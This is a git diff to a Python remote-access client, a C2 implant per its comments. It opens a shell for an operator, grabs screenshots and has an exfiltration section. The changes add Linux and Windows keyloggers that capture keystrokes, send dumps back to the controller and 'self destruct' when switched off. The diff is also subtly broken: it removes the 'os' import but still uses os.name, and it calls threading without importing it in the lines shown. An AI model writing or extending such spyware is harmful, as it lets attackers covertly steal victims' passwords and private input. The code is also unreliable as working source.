@@ -1,18 +1,21 @@
 #!/usr/bin/python3
 
 import socket
-import subprocess            # libray which enables us to use trgt OS command in C2 server
-import os                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
+import subprocess              # libray which enables us to use trgt OS command in C2 server
 
-import json                  # The process of encoding JSON is usually called serialization.
-			     # This term refers to the transformation of data into a series of bytes
-			     # (hence serial) to be stored or transmitted across a network
+import json                    # The process of encoding JSON is usually called serialization.
+			       # This term refers to the transformation of data into a series of bytes
+			       # (hence serial) to be stored or transmitted across a network
+
+import PIL.ImageGrab           # python library for taking screenshot
 
 
-import PIL.ImageGrab         # python library for taking screenshot
+from termcolor import colored  # python coloring library
 
 
 from lnx_keylogger import *
+
+from win_keylogger import *
 
 # Sending whole data all at once
 def recv_eff():
@@ -81,6 +84,78 @@ def screenshot():
 	img.save(r'scrn_sht.png')
 
 
+# Linux Keylogging
+def lnx_keylog(cmd):
+
+	# keylogger on
+	if cmd[:9] == 'keylog_on' and len(cmd) > 1:
+
+		global t
+
+		l_keylog = Lnx_Keylogger()
+		t = threading.Thread(target=l_keylog.keylog_start)
+
+		t.start()
+
+		send_eff(colored("[+] Keylogger started!!",'green'))
+
+	# keylog dump
+	elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
+
+		l_keylog =  Lnx_Keylogger()
+		dumps = l_keylog.read_logs()
+
+		send_eff(colored(dumps,'green'))
+
+
+	# keylogger off and self destruct
+	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
+
+		l_keylog =  Lnx_Keylogger()
+
+		l_keylog.keylog_off_self_destruct()
+
+		t.join()
+
+		send_eff(colored("[+] Keylogger stopped!!", 'green'))
+
+
+
+# Windows Keylogging
+def win_keylog(cmd):
+
+	# keylogger on
+	if cmd[:9] == 'keylog_on' and len(cmd) > 1:
+
+		w_keylog = Win_Keylogger()
+		t = threading.Thread(target=w_keylog.keylog_start)
+
+		t.start()
+
+		send_eff(colored("[+] Keylogger started!!",'green'))
+
+	# keylog dump
+	elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
+
+		w_keylog =  Win_Keylogger()
+		dumps = w_keylog.read_logs()
+
+		send_eff(colored(dumps,'green'))
+
+
+	# keylogger off and self destruct
+	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
+
+		w_keylog =  Win_Keylogger()
+
+		w_keylog.keylog_off_self_destruct()
+
+		t.join()
+
+		send_eff(colored("[+] Keylogger stopped!!", 'green'))
+
+
+
 # Offering a shell from trgt
 def shell():
 
@@ -142,27 +217,15 @@ def shell():
 
 
 
-		# keylogger on
-		elif cmd[:9] == 'keylog_on' and len(cmd) > 1:
+		# keylogging
+		elif cmd[:6] == 'keylog' and len(cmd) > 1:
 
-			keylog_start()
-			send_eff("[+] Keylogger started!!")
-
-		# keylog dump
-		elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
-
-			k_dump = key_dump()
-			send_eff("[+] Dumping keystrokes...")
-			send_eff(k_dump)
-
-		# keylogger off and self destruct
-		elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
-
-			send_eff("[+] Keylogger stopped!!")
-
-			upload_file(lnx_path)
-
-			keylog_off_self_destruct()
+			if os.name == 'nt':
+				# Windows
+				win_keylog(cmd)
+			else:
+				#Linux
+				lnx_keylog(cmd)
 
 
 		# Exfiltration in trgt point of view ✓
